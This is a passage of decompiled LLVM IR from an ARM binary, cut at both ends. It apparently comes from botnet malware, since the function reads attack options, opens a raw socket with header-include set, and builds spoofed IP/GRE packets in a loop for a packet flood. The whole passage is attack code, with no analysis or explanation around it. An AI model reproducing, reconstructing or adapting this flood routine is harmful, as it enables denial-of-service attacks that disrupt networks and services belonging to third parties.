  %v7_8a04 = call i32 @attack_get_opt_int(i32 %v0_89fc, i32* %v6_8a04, i32 3, i32 add (i32 ptrtoint (i32* @global_var_10000.57 to i32), i32 -1), i32 %v6_89e0)
  %v0_8a08 = load i32, i32* @r5, align 4
  store i32 %v0_8a08, i32* %r1.global-to-local, align 4
  store i32 4, i32* %r2.global-to-local, align 4
  store i32 64, i32* %r3.global-to-local, align 4
  store i32 %v7_8a04, i32* %fp.global-to-local, align 4
  %v0_8a18 = load i32, i32* @r4, align 4
  store i32 %v0_8a18, i32* %r0.global-to-local, align 4
  %v5_8a1c = inttoptr i32 %v0_8a08 to i32*
  %v6_8a1c = call i32 @attack_get_opt_int(i32 %v0_8a18, i32* %v5_8a1c, i32 4, i32 64, i32 ptrtoint (i32* @0 to i32))
  %v1_8a24 = urem i32 %v6_8a1c, 256
  store i32 %v1_8a24, i32* %ip.global-to-local, align 4
  %v0_8a28 = load i32, i32* @r5, align 4
  store i32 %v0_8a28, i32* %r1.global-to-local, align 4
  store i32 5, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v0_8a34 = load i32, i32* @r4, align 4
  store i32 %v0_8a34, i32* %r0.global-to-local, align 4
  %v6_8a3c = inttoptr i32 %v0_8a28 to i32*
  %v7_8a3c = call i32 @attack_get_opt_int(i32 %v0_8a34, i32* %v6_8a3c, i32 5, i32 1, i32 %v1_8a24)
  %v1_8a48 = urem i32 %v7_8a3c, 256
  store i32 %v1_8a48, i32* %ip.global-to-local, align 4
  store i32 add (i32 ptrtoint (i32* @global_var_10000.57 to i32), i32 -1), i32* %r3.global-to-local, align 4
  store i32 6, i32* %r2.global-to-local, align 4
  %v0_8a54 = load i32, i32* @r5, align 4
  store i32 %v0_8a54, i32* %r1.global-to-local, align 4
  %v0_8a58 = load i32, i32* @r4, align 4
  store i32 %v0_8a58, i32* %r0.global-to-local, align 4
  %v5_8a60 = inttoptr i32 %v0_8a54 to i32*
  %v6_8a60 = call i32 @attack_get_opt_int(i32 %v0_8a58, i32* %v5_8a60, i32 6, i32 add (i32 ptrtoint (i32* @global_var_10000.57 to i32), i32 -1), i32 %v1_8a48)
  %v0_8a68 = load i32, i32* @r5, align 4
  store i32 %v0_8a68, i32* %r1.global-to-local, align 4
  store i32 add (i32 ptrtoint (i32* @global_var_10000.57 to i32), i32 -1), i32* %r3.global-to-local, align 4
  store i32 7, i32* %r2.global-to-local, align 4
  store i32 %v6_8a60, i32* @r8, align 4
  %v0_8a78 = load i32, i32* @r4, align 4
  store i32 %v0_8a78, i32* %r0.global-to-local, align 4
  %v5_8a7c = inttoptr i32 %v0_8a68 to i32*
  %v6_8a7c = call i32 @attack_get_opt_int(i32 %v0_8a78, i32* %v5_8a7c, i32 7, i32 add (i32 ptrtoint (i32* @global_var_10000.57 to i32), i32 -1), i32 ptrtoint (i32* @0 to i32))
  %v0_8a80 = load i32, i32* @r5, align 4
  store i32 %v0_8a80, i32* %r1.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  store i32 512, i32* %r3.global-to-local, align 4
  store i32 %v6_8a7c, i32* @r7, align 4
  %v0_8a90 = load i32, i32* @r4, align 4
  store i32 %v0_8a90, i32* %r0.global-to-local, align 4
  %v5_8a94 = inttoptr i32 %v0_8a80 to i32*
  %v6_8a94 = call i32 @attack_get_opt_int(i32 %v0_8a90, i32* %v5_8a94, i32 0, i32 512, i32 ptrtoint (i32* @0 to i32))
  store i32 1, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v0_8aa4 = load i32, i32* @r5, align 4
  store i32 %v0_8aa4, i32* %r1.global-to-local, align 4
  %v0_8aa8 = load i32, i32* @r4, align 4
  store i32 %v0_8aa8, i32* %r0.global-to-local, align 4
  %v5_8aac = inttoptr i32 %v0_8aa4 to i32*
  %v6_8aac = call i32 @attack_get_opt_int(i32 %v0_8aa8, i32* %v5_8aac, i32 1, i32 1, i32 ptrtoint (i32* @0 to i32))
  %v1_8ab4 = urem i32 %v6_8aac, 256
  store i32 %v1_8ab4, i32* %ip.global-to-local, align 4
  %v0_8ab8 = load i32, i32* @r5, align 4
  store i32 %v0_8ab8, i32* %r1.global-to-local, align 4
  store i32 19, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_8ac4 = load i32, i32* @r4, align 4
  store i32 %v0_8ac4, i32* %r0.global-to-local, align 4
  %v5_8acc = inttoptr i32 %v0_8ab8 to i32*
  %v6_8acc = call i32 @attack_get_opt_int(i32 %v0_8ac4, i32* %v5_8acc, i32 19, i32 0, i32 %v1_8ab4)
  %v0_8ad4 = load i32, i32* @r5, align 4
  store i32 %v0_8ad4, i32* %r1.global-to-local, align 4
  %v2_8ad8 = load i32, i32* @global_var_24f80.59, align 4
  store i32 %v2_8ad8, i32* %r3.global-to-local, align 4
  store i32 %v6_8acc, i32* @r6, align 4
  store i32 25, i32* %r2.global-to-local, align 4
  %v0_8ae4 = load i32, i32* @r4, align 4
  store i32 %v0_8ae4, i32* %r0.global-to-local, align 4
  %v5_8ae8 = inttoptr i32 %v0_8ad4 to i32*
  %v6_8ae8 = call i32 @attack_get_opt_int(i32 %v0_8ae4, i32* %v5_8ae8, i32 25, i32 %v2_8ad8, i32 ptrtoint (i32* @0 to i32))
  store i32 3, i32* %r1.global-to-local, align 4
  store i32 6, i32* %r2.global-to-local, align 4
  store i32 2, i32* %r0.global-to-local, align 4
  %v3_8afc = call i32 @socket(i32 2, i32 3, i32 6)
  store i32 %v3_8afc, i32* %r0.global-to-local, align 4
  %v7_8b00 = icmp eq i32 %v3_8afc, -1
  store i1 %v7_8b00, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_8b00, label %dec_label_pc_9014, label %dec_label_pc_8b0c

dec_label_pc_8b0c:                                ; preds = %entry
  store i32 1, i32* %stack_var_-44, align 4
  %v6_8b14 = ptrtoint i32* %stack_var_-44 to i32
  store i32 %v6_8b14, i32* %r3.global-to-local, align 4
  store i32 4, i32* %ip.global-to-local, align 4
  store i32 0, i32* @r1, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  %v5_8b28 = call i32 @__GI_setsockopt(i32 %v3_8afc, i32 0, i32 3, i32 %v6_8b14, i32 4)
  store i32 %v5_8b28, i32* %r0.global-to-local, align 4
  %v7_8b2c = icmp eq i32 %v5_8b28, -1
  store i1 %v7_8b2c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_8b2c, label %dec_label_pc_900c, label %dec_label_pc_8b34

dec_label_pc_8b34:                                ; preds = %dec_label_pc_8b0c
  %v0_8b34 = load i32, i32* @r8, align 4
  %v0_8b38 = load i32, i32* @r7, align 4
  %v0_8b3c = load i32, i32* %fp.global-to-local, align 4
  %v0_8b40 = load i32, i32* @r6, align 4
  %v1_8b40 = urem i32 %v0_8b40, 256
  store i32 0, i32* %r1.global-to-local, align 4
  %v3_8b48 = urem i32 %v0_8b34, 65536
  store i32 %v3_8b48, i32* %r3.global-to-local, align 4
  %v3_8b4c = urem i32 %v0_8b38, 65536
  store i32 %v3_8b4c, i32* %r4.global-to-local, align 4
  %v0_8b50 = load i32, i32* @sl, align 4
  %v2_8b50 = icmp eq i32 %v0_8b50, 0
  store i1 %v2_8b50, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %stack_var_-44, align 4
  %v3_8b68 = urem i32 %v0_8b3c, 65536
  store i32 %v3_8b68, i32* @fp, align 4
  br i1 %v2_8b50, label %dec_label_pc_9020, label %dec_label_pc_8b78

dec_label_pc_8b78:                                ; preds = %dec_label_pc_8b34
  %v3_8b38 = mul i32 %v0_8b38, 65536
  %v3_8b34 = mul i32 %v0_8b34, 65536
  %v0_8b3c.not = or i32 %v0_8b3c, -65536
  %v1_8b7c = xor i32 %v0_8b3c.not, 65535
  %v3_8b80 = mul i32 %v6_8a94, 65536
  %v1_8b84 = add i32 %v3_8b80, 4325376
  %tmp73 = udiv i32 %v1_8b84, 256
  %v3_8b98 = and i32 %tmp73, 65280
  %tmp74 = mul nsw i32 %v1_8b7c, 256
  %v3_8b9c = and i32 %tmp74, 65280
  store i32 %v3_8b9c, i32* %ip.global-to-local, align 4
  %v1_8ba0 = add i32 %v3_8b80, 524288
  %v1_8ba8 = add i32 %v3_8b80, 1835008
  %tmp75 = udiv i32 %v1_8b7c, 256
  %v4_8bac = urem i32 %tmp75, 256
  %v5_8bac = or i32 %v4_8bac, %v3_8b9c
  %v4_8bb4 = udiv i32 %v1_8b84, 16777216
  %v5_8bb4 = or i32 %v3_8b98, %v4_8bb4
  store i32 %v5_8bb4, i32* @r8, align 4
  %v3_8bc0 = udiv i32 %v1_8ba8, 256
  %tmp76 = mul i32 %v0_8b3c, 256
  %v3_8bc4 = and i32 %tmp76, 65280
  store i32 %v3_8b34, i32* %r2.global-to-local, align 4
  %tmp77 = udiv i32 %v0_8b3c, 256
  %v4_8bd4 = urem i32 %tmp77, 256
  %v5_8bd4 = or i32 %v4_8bd4, %v3_8bc4
  store i32 %v5_8bd4, i32* %r0.global-to-local, align 4
  %tmp78 = mul i32 %v0_8b34, 256
  %v3_8bd8 = and i32 %tmp78, 65280
  %v1_8bdc = and i32 %v3_8bc0, 65280
  store i32 %v1_8bdc, i32* @r6, align 4
  store i32 %v3_8b38, i32* %r1.global-to-local, align 4
  %tmp79 = mul i32 %v0_8b38, 256
  %v3_8be8 = and i32 %tmp79, 65280
  %tmp80 = udiv i32 %v0_8b34, 256
  %v4_8bec = urem i32 %tmp80, 256
  %v5_8bec = or i32 %v4_8bec, %v3_8bd8
  store i32 %v5_8bec, i32* @lr, align 4
  %v4_8bf0 = udiv i32 %v1_8ba8, 16777216
  %v5_8bf0 = or i32 %v1_8bdc, %v4_8bf0
  store i32 %v5_8bf0, i32* %r3.global-to-local, align 4
  %tmp81 = udiv i32 %v0_8b38, 256
  %v4_8bf4 = urem i32 %tmp81, 256
  %v5_8bf4 = or i32 %v4_8bf4, %v3_8be8
  %tmp82 = udiv i32 %v1_8ba0, 256
  %v3_8bf8 = and i32 %tmp82, 65280
  store i32 %v3_8bf8, i32* @r5, align 4
  %v5_8bfc = trunc i32 %v5_8bd4 to i16
  %v5_8c04 = trunc i32 %v5_8bf0 to i16
  %v4_8c0c = udiv i32 %v1_8ba0, 16777216
  %v5_8c0c = or i32 %v3_8bf8, %v4_8c0c
  store i32 %v5_8c0c, i32* @r7, align 4
  store i32 0, i32* @r4, align 4
  %v1_8c74 = trunc i32 %v6_8a1c to i8
  %sext = mul nuw i32 %v5_8bac, 65536
  %v4_8d00 = sdiv i32 %sext, 65536
  %v2_8d2c = icmp eq i32 %v1_8b40, 0
  %sext8 = mul nuw i32 %v5_8bec, 65536
  %v4_8d4c = sdiv i32 %sext8, 65536
  %sext9 = mul nuw i32 %v5_8bf4, 65536
  %v4_8d54 = sdiv i32 %sext9, 65536
  %v1_8d0c27 = trunc i32 %v4_8d00 to i16
  br label %dec_label_pc_8c14

dec_label_pc_8c14:                                ; preds = %bb85, %dec_label_pc_8b78
  store i32 4, i32* %r1.global-to-local, align 4
  store i32 1510, i32* %r0.global-to-local, align 4
  %v2_8c20 = call i32 @calloc(i32 1510, i32 4)
  store i32 %v2_8c20, i32* %r0.global-to-local, align 4
  %v2_8c28 = load i32, i32* @r4, align 4
  %v5_8c28 = mul i32 %v2_8c28, 4
  %v6_8c28 = add i32 %v5_8c28, %v2_89c8
  %v7_8c28 = inttoptr i32 %v6_8c28 to i32*
  store i32 %v2_8c20, i32* %v7_8c28, align 4
  %v3_8c2c = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_8c2c, i32* %r2.global-to-local, align 4
  %v5_8c34 = mul i32 %v3_8c2c, 24
  %v1_8c38 = load i32, i32* @sb, align 4
  %v2_8c38 = add i32 %v1_8c38, %v5_8c34
  store i32 %v2_8c38, i32* @lr, align 4
  store i32 %v2_89c8, i32* %r3.global-to-local, align 4
  %v4_8c40 = mul i32 %v3_8c2c, 4
  %v5_8c40 = add i32 %v4_8c40, %v2_89c8
  %v6_8c40 = inttoptr i32 %v5_8c40 to i32*
  %v7_8c40 = load i32, i32* %v6_8c40, align 4
  store i32 %v7_8c40, i32* %r4.global-to-local, align 4
  %v1_8c44 = inttoptr i32 %v7_8c40 to i8*
  %v2_8c44 = load i8, i8* %v1_8c44, align 1
  %tmp = urem i8 %v2_8c44, 16
  %v1_8c48 = zext i8 %tmp to i32
  %v1_8c4c = or i32 %v1_8c48, 64
  store i32 %v1_8c4c, i32* %r3.global-to-local, align 4
  %v1_8c50 = trunc i32 %v1_8c4c to i8
  store i8 %v1_8c50, i8* %v1_8c44, align 1
  %v0_8c54 = load i32, i32* %r4.global-to-local, align 4
  %v1_8c54 = inttoptr i32 %v0_8c54 to i8*
  %v2_8c54 = load i8, i8* %v1_8c54, align 1
  %v1_8c58 = and i8 %v2_8c54, -16
  %v1_8c5c = or i8 %v1_8c58, 5
  store i32 %v1_8a48, i32* %r5.global-to-local, align 4
  store i8 %v1_8c5c, i8* %v1_8c54, align 1
  store i32 %v6_89e0, i32* %r1.global-to-local, align 4
  %v2_8c6c = load i32, i32* %r4.global-to-local, align 4
  %v3_8c6c = add i32 %v2_8c6c, 1
  %v4_8c6c = inttoptr i32 %v3_8c6c to i8*
  store i8 %v5_8a00, i8* %v4_8c6c, align 1
  store i32 %v1_8a24, i32* %r2.global-to-local, align 4
  %v2_8c74 = load i32, i32* %r4.global-to-local, align 4
  %v3_8c74 = add i32 %v2_8c74, 8
  %v4_8c74 = inttoptr i32 %v3_8c74 to i8*
  store i8 %v1_8c74, i8* %v4_8c74, align 1
  %v2_8c7c = load i32, i32* %r4.global-to-local, align 4
  %v3_8c7c = add i32 %v2_8c7c, 4
  %v4_8c7c = inttoptr i32 %v3_8c7c to i16*
  store i16 %v5_8bfc, i16* %v4_8c7c, align 2
  %v2_8c84 = load i32, i32* %r4.global-to-local, align 4
  %v3_8c84 = add i32 %v2_8c84, 9
  %v4_8c84 = inttoptr i32 %v3_8c84 to i8*
  store i8 47, i8* %v4_8c84, align 1
  store i32 %v6_8ae8, i32* %r3.global-to-local, align 4
  %v0_8c8c = load i32, i32* %r5.global-to-local, align 4
  %v2_8c8c = icmp eq i32 %v0_8c8c, 0
  store i1 %v2_8c8c, i1* %cpsr_z.global-to-local, align 1
  %v1_8c90 = load i32, i32* %r4.global-to-local, align 4
  %v2_8c90 = add i32 %v1_8c90, 12
  %v3_8c90 = inttoptr i32 %v2_8c90 to i32*
  store i32 %v6_8ae8, i32* %v3_8c90, align 4
  br i1 %v2_8c8c, label %.thread25, label %bb

bb:                                               ; preds = %dec_label_pc_8c14
  store i32 64, i32* %r2.global-to-local, align 4
  %v3_8c98 = load i32, i32* %r4.global-to-local, align 4
  %v4_8c98 = add i32 %v3_8c98, 6
  %v5_8c98 = inttoptr i32 %v4_8c98 to i16*
  store i16 64, i16* %v5_8c98, align 2
  br label %.thread25

.thread25:                                        ; preds = %dec_label_pc_8c14, %bb
  %v0_8c9c = load i32, i32* @lr, align 4
  %v1_8c9c = add i32 %v0_8c9c, 16
  %v2_8c9c = inttoptr i32 %v1_8c9c to i32*
  %v3_8c9c = load i32, i32* %v2_8c9c, align 4
  store i32 22528, i32* %ip.global-to-local, align 4
  %v1_8ca4 = load i32, i32* %r4.global-to-local, align 4
  %v2_8ca4 = add i32 %v1_8ca4, 16
  %v3_8ca4 = inttoptr i32 %v2_8ca4 to i32*
  store i32 %v3_8c9c, i32* %v3_8ca4, align 4
  %v0_8ca8 = load i32, i32* %r4.global-to-local, align 4
  %v1_8ca8 = add i32 %v0_8ca8, 24
  store i32 %v1_8ca8, i32* %r1.global-to-local, align 4
  %v1_8cac = add i32 %v0_8ca8, 20
  store i32 %v1_8cac, i32* %r0.global-to-local, align 4
  %v0_8cb0 = load i32, i32* %ip.global-to-local, align 4
  %v1_8cb0 = add i32 %v0_8cb0, 101
  store i32 %v1_8cb0, i32* %ip.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 8, i32* %r2.global-to-local, align 4
  %v0_8cbc = load i32, i32* @r8, align 4
  %v1_8cbc = trunc i32 %v0_8cbc to i16
  %v3_8cbc = add i32 %v0_8ca8, 2
  %v4_8cbc = inttoptr i32 %v3_8cbc to i16*
  store i16 %v1_8cbc, i16* %v4_8cbc, align 2
  %v0_8cc0 = load i32, i32* %ip.global-to-local, align 4
  %v1_8cc0 = trunc i32 %v0_8cc0 to i16
  %v2_8cc0 = load i32, i32* %r0.global-to-local, align 4
  %v3_8cc0 = add i32 %v2_8cc0, 2
  %v4_8cc0 = inttoptr i32 %v3_8cc0 to i16*
  store i16 %v1_8cc0, i16* %v4_8cc0, align 2
  %v0_8cc4 = load i32, i32* %r3.global-to-local, align 4
  %v1_8cc4 = trunc i32 %v0_8cc4 to i8
  %v2_8cc4 = load i32, i32* %r1.global-to-local, align 4
  %v3_8cc4 = add i32 %v2_8cc4, 13
  %v4_8cc4 = inttoptr i32 %v3_8cc4 to i8*
  store i8 %v1_8cc4, i8* %v4_8cc4, align 1
  %v0_8cc8 = load i32, i32* %r2.global-to-local, align 4
  %v1_8cc8 = trunc i32 %v0_8cc8 to i8
  %v2_8cc8 = load i32, i32* %r1.global-to-local, align 4
  %v3_8cc8 = add i32 %v2_8cc8, 12
  %v4_8cc8 = inttoptr i32 %v3_8cc8 to i8*
  store i8 %v1_8cc8, i8* %v4_8cc8, align 1
  %v0_8ccc = load i32, i32* %r4.global-to-local, align 4
  %v1_8ccc = add i32 %v0_8ccc, 38
  %v2_8ccc = inttoptr i32 %v1_8ccc to i8*
  %v3_8ccc = load i8, i8* %v2_8ccc, align 1
  %tmp87 = urem i8 %v3_8ccc, 16
  %v1_8cd0 = zext i8 %tmp87 to i32
  %v1_8cd4 = or i32 %v1_8cd0, 64
  store i32 %v1_8cd4, i32* %r3.global-to-local, align 4
  %v1_8cd8 = trunc i32 %v1_8cd4 to i8
  store i8 %v1_8cd8, i8* %v2_8ccc, align 1
  %v0_8cdc = load i32, i32* %r4.global-to-local, align 4
  %v1_8cdc = add i32 %v0_8cdc, 38
  %v2_8cdc = inttoptr i32 %v1_8cdc to i8*
  %v3_8cdc = load i8, i8* %v2_8cdc, align 1
  %v1_8ce0 = and i8 %v3_8cdc, -16
  %v1_8ce4 = or i8 %v1_8ce0, 5
  store i8 %v1_8ce4, i8* %v2_8cdc, align 1
  %v0_8cf0 = load i32, i32* %r4.global-to-local, align 4
  %v1_8cf0 = add i32 %v0_8cf0, 38
  store i32 %v1_8cf0, i32* @r5, align 4
  %v3_8cf4 = add i32 %v0_8cf0, 39
  %v4_8cf4 = inttoptr i32 %v3_8cf4 to i8*
  store i8 %v5_8a00, i8* %v4_8cf4, align 1
  store i32 %v5_8bf0, i32* %r2.global-to-local, align 4
  %v2_8cfc = load i32, i32* @r5, align 4
  %v3_8cfc = add i32 %v2_8cfc, 2
  %v4_8cfc = inttoptr i32 %v3_8cfc to i16*
  store i16 %v5_8c04, i16* %v4_8cfc, align 2
  store i32 %v4_8d00, i32* %r3.global-to-local, align 4
  store i32 %v1_8a24, i32* %r1.global-to-local, align 4
  %v0_8d08 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_8d08, label %.thread26, label %bb83

.thread26:                                        ; preds = %.thread25
  %v2_8d0c28 = load i32, i32* @r5, align 4
  %v3_8d0c29 = add i32 %v2_8d0c28, 4
  %v4_8d0c30 = inttoptr i32 %v3_8d0c29 to i16*
  store i16 %v1_8d0c27, i16* %v4_8d0c30, align 2
  store i32 17, i32* %r3.global-to-local, align 4
  br label %bb84

bb83:                                             ; preds = %.thread25
  store i32 64, i32* %r2.global-to-local, align 4
  %v2_8d0c = load i32, i32* @r5, align 4
  %v3_8d0c = add i32 %v2_8d0c, 4
  %v4_8d0c = inttoptr i32 %v3_8d0c to i16*
  store i16 %v1_8d0c27, i16* %v4_8d0c, align 2
  store i32 17, i32* %r3.global-to-local, align 4
  %v1_8d14 = load i32, i32* %r2.global-to-local, align 4
  %v2_8d14 = trunc i32 %v1_8d14 to i16
  %v3_8d14 = load i32, i32* @r5, align 4
  %v4_8d14 = add i32 %v3_8d14, 6
  %v5_8d14 = inttoptr i32 %v4_8d14 to i16*
  store i16 %v2_8d14, i16* %v5_8d14, align 2
  br label %bb84

bb84:                                             ; preds = %.thread26, %bb83
  %v0_8d18 = load i32, i32* %r1.global-to-local, align 4
  %v1_8d18 = trunc i32 %v0_8d18 to i8
  %v2_8d18 = load i32, i32* @r5, align 4
  %v3_8d18 = add i32 %v2_8d18, 8
  %v4_8d18 = inttoptr i32 %v3_8d18 to i8*
  store i8 %v1_8d18, i8* %v4_8d18, align 1
  %v0_8d1c = load i32, i32* %r3.global-to-local, align 4
  %v1_8d1c = trunc i32 %v0_8d1c to i8
  %v2_8d1c = load i32, i32* @r5, align 4
  %v3_8d1c = add i32 %v2_8d1c, 9
  %v4_8d1c = inttoptr i32 %v3_8d1c to i8*
  store i8 %v1_8d1c, i8* %v4_8d1c, align 1
  %v0_8d20 = call i32 @rand_next()
  store i32 %v0_8d20, i32* %r0.global-to-local, align 4
  store i32 %v1_8b40, i32* %r1.global-to-local, align 4
  store i1 %v2_8d2c, i1* %cpsr_z.global-to-local, align 1
  %v1_8d30 = sub i32 1023, %v0_8d20
  store i32 %v1_8d30, i32* %r3.global-to-local, align 4
  br i1 %v2_8d2c, label %.thread, label %.thread10

.thread:                                          ; preds = %bb84
  %v2_8d38 = load i32, i32* @r5, align 4
  %v3_8d38 = add i32 %v2_8d38, 16
  %v4_8d38 = inttoptr i32 %v3_8d38 to i32*
  store i32 %v1_8d30, i32* %v4_8d38, align 4
  br label %bb85

.thread10:                                        ; preds = %bb84
  %v1_8d34 = load i32, i32* %r4.global-to-local, align 4
  %v2_8d34 = add i32 %v1_8d34, 16
  %v3_8d34 = inttoptr i32 %v2_8d34 to i32*
  %v4_8d34 = load i32, i32* %v3_8d34, align 4
  store i32 %v4_8d34, i32* %r3.global-to-local, align 4
  %v2_8d3c = load i32, i32* @r5, align 4
  %v3_8d3c = add i32 %v2_8d3c, 16
  %v4_8d3c = inttoptr i32 %v3_8d3c to i32*
  store i32 %v4_8d34, i32* %v4_8d3c, align 4
  br label %bb85

bb85:                                             ; preds = %.thread, %.thread10
  %v1_8d40 = load i32, i32* @r5, align 4
  %v2_8d40 = add i32 %v1_8d40, 12
  %v3_8d40 = inttoptr i32 %v2_8d40 to i32*
  store i32 %v0_8d20, i32* %v3_8d40, align 4
  %v3_8d44 = load i32, i32* %stack_var_-44, align 4
  %v0_8d48 = load i32, i32* %r4.global-to-local, align 4
  %v1_8d48 = add i32 %v0_8d48, 58
  store i32 %v1_8d48, i32* @r6, align 4
  store i32 %v4_8d4c, i32* %r2.global-to-local, align 4
  %v1_8d50 = add i32 %v3_8d44, 1
  store i32 %v1_8d50, i32* @r4, align 4
  store i32 %v4_8d54, i32* %r3.global-to-local, align 4
  %v1_8d58 = load i32, i32* @sl, align 4
  %v9_8d58 = icmp eq i32 %v1_8d50, %v1_8d58
  store i1 %v9_8d58, i1* %cpsr_z.global-to-local, align 1
  %v0_8d5c = load i32, i32* @r7, align 4
  %v1_8d5c = trunc i32 %v0_8d5c to i16
  %v3_8d5c = add i32 %v0_8d48, 62
  %v4_8d5c = inttoptr i32 %v3_8d5c to i16*
  store i16 %v1_8d5c, i16* %v4_8d5c, align 2
  %v0_8d60 = load i32, i32* %r2.global-to-local, align 4
  %v1_8d60 = trunc i32 %v0_8d60 to i16
  %v2_8d60 = load i32, i32* @r6, align 4
  %v3_8d60 = inttoptr i32 %v2_8d60 to i16*
  store i16 %v1_8d60, i16* %v3_8d60, align 2
  %v0_8d64 = load i32, i32* %r3.global-to-local, align 4
  %v1_8d64 = trunc i32 %v0_8d64 to i16
  %v2_8d64 = load i32, i32* @r6, align 4
  %v3_8d64 = add i32 %v2_8d64, 2
  %v4_8d64 = inttoptr i32 %v3_8d64 to i16*
  store i16 %v1_8d64, i16* %v4_8d64, align 2
  %v0_8d68 = load i32, i32* @r4, align 4
  store i32 %v0_8d68, i32* %stack_var_-44, align 4
  %v5_8d6c = icmp slt i32 %v1_8d50, %v1_8d58
  br i1 %v5_8d6c, label %dec_label_pc_8c14, label %dec_label_pc_8d70

dec_label_pc_8d70:                                ; preds = %bb85
  %v1_8d78 = add i32 %v6_8a94, 8
  store i32 %v1_8d78, i32* %r4.global-to-local, align 4
  %v1_8d7c = add i32 %v6_8a94, 66
  store i32 %v1_8d7c, i32* %r5.global-to-local, align 4
  %v0_8d8c.pre.pre = load i32, i32* @sl, align 4
  br label %dec_label_pc_8d88.preheader

dec_label_pc_8d88.preheader:                      ; preds = %dec_label_pc_8d70, %dec_label_pc_9020
  %v0_8d8c.pre = phi i32 [ %v0_8d8c.pre.pre, %dec_label_pc_8d70 ], [ 0, %dec_label_pc_9020 ]
  %stack_var_-132.0.ph = phi i32 [ %v1_8d7c, %dec_label_pc_8d70 ], [ %v1_902c, %dec_label_pc_9020 ]
  %stack_var_-136.0.ph = phi i32 [ %v1_8d78, %dec_label_pc_8d70 ], [ %v1_9028, %dec_label_pc_9020 ]
  %v2_8fdc = icmp eq i32 %v1_8b40, 0
  %v2_8e24 = ptrtoint i32* %stack_var_-48 to i32
  %v2_8e3c = ptrtoint i32* %stack_var_-52 to i32
  %v2_8e4c = ptrtoint i32* %stack_var_-56 to i32
  %v2_8e58 = ptrtoint i32* %stack_var_-54 to i32
  %v2_8e6c = icmp eq i32 %v1_8ab4, 0
  %v2_8dcc = icmp eq i32 %v6_8ae8, -1
  %v7_8dcc = icmp eq i32 %v6_8ae8, -1
  br label %dec_label_pc_8d88

dec_label_pc_8d88:                                ; preds = %dec_label_pc_8d88, %dec_label_pc_8e74, %dec_label_pc_8d88.preheader
  %v0_8d8c = phi i32 [ %v0_8d8c.pre, %dec_label_pc_8d88.preheader ], [ 0, %dec_label_pc_8d88 ], [ %v1_8f10, %dec_label_pc_8e74 ]
  store i32 0, i32* %r3.global-to-local, align 4
  %v2_8d8c = icmp eq i32 %v0_8d8c, 0
  store i1 %v2_8d8c, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %stack_var_-44, align 4
  br i1 %v2_8d8c, label %dec_label_pc_8d88, label %dec_label_pc_8d98

dec_label_pc_8d98:                                ; preds = %dec_label_pc_8d88
  store i32 0, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_8d9c

dec_label_pc_8d9c:                                ; preds = %dec_label_pc_8e74, %dec_label_pc_8d98
  %v1_8db0 = phi i32 [ %v1_8f0c, %dec_label_pc_8e74 ], [ 0, %dec_label_pc_8d98 ]
  %v5_8da0 = mul i32 %v1_8db0, 24
  %v1_8da4 = load i32, i32* @sb, align 4
  %v2_8da4 = add i32 %v1_8da4, %v5_8da0
  store i32 %v2_8da4, i32* %r3.global-to-local, align 4
  store i32 %v2_89c8, i32* %r4.global-to-local, align 4
  %v1_8dac = add i32 %v2_8da4, 20
  %v2_8dac = inttoptr i32 %v1_8dac to i8*
  %v3_8dac = load i8, i8* %v2_8dac, align 1
  %v4_8dac = zext i8 %v3_8dac to i32
  store i32 %v4_8dac, i32* %r2.global-to-local, align 4
  %v4_8db0 = mul i32 %v1_8db0, 4
  %v5_8db0 = add i32 %v4_8db0, %v2_89c8
  %v6_8db0 = inttoptr i32 %v5_8db0 to i32*
  %v7_8db0 = load i32, i32* %v6_8db0, align 4
  store i32 %v7_8db0, i32* @r5, align 4
  %v7_8db4 = icmp eq i8 %v3_8dac, 31
  store i1 %v7_8db4, i1* %cpsr_z.global-to-local, align 1
  %v1_8db8 = add i32 %v7_8db0, 24
  store i32 %v1_8db8, i32* @r7, align 4
  %v1_8dbc = add i32 %v7_8db0, 38
  store i32 %v1_8dbc, i32* @r6, align 4
  %v1_8dc0 = add i32 %v7_8db0, 58
  store i32 %v1_8dc0, i32* @r8, align 4
  %tmp88 = icmp ult i8 %v3_8dac, 32
  br i1 %tmp88, label %dec_label_pc_8f20, label %dec_label_pc_8dc8

dec_label_pc_8dc8:                                ; preds = %dec_label_pc_8d9c
  store i32 %v6_8ae8, i32* %r1.global-to-local, align 4
  store i1 %v7_8dcc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_8dcc, label %dec_label_pc_8f80, label %dec_label_pc_8dd4

dec_label_pc_8dd4:                                ; preds = %dec_label_pc_8f20, %dec_label_pc_8dc8
  store i32 add (i32 ptrtoint (i32* @global_var_10000.57 to i32), i32 -1), i32* %r4.global-to-local, align 4
  %v0_8ddc = load i32, i32* @fp, align 4
  %v9_8ddc = icmp eq i32 %v0_8ddc, add (i32 ptrtoint (i32* @global_var_10000.57 to i32), i32 -1)
  store i1 %v9_8ddc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_8ddc, label %dec_label_pc_8f98, label %dec_label_pc_8de4

dec_label_pc_8de4:                                ; preds = %dec_label_pc_8f80.dec_label_pc_8de4_crit_edge, %dec_label_pc_8dd4
  %v1_8de8 = phi i32 [ %v1_8de8.pre, %dec_label_pc_8f80.dec_label_pc_8de4_crit_edge ], [ add (i32 ptrtoint (i32* @global_var_10000.57 to i32), i32 -1), %dec_label_pc_8dd4 ]
  store i32 %v3_8b48, i32* %r2.global-to-local, align 4
  %v9_8de8 = icmp eq i32 %v3_8b48, %v1_8de8
  store i1 %v9_8de8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_8de8, label %dec_label_pc_8fc0, label %dec_label_pc_8df0

dec_label_pc_8df0:                                ; preds = %dec_label_pc_8f98.dec_label_pc_8df0_crit_edge, %dec_label_pc_8de4
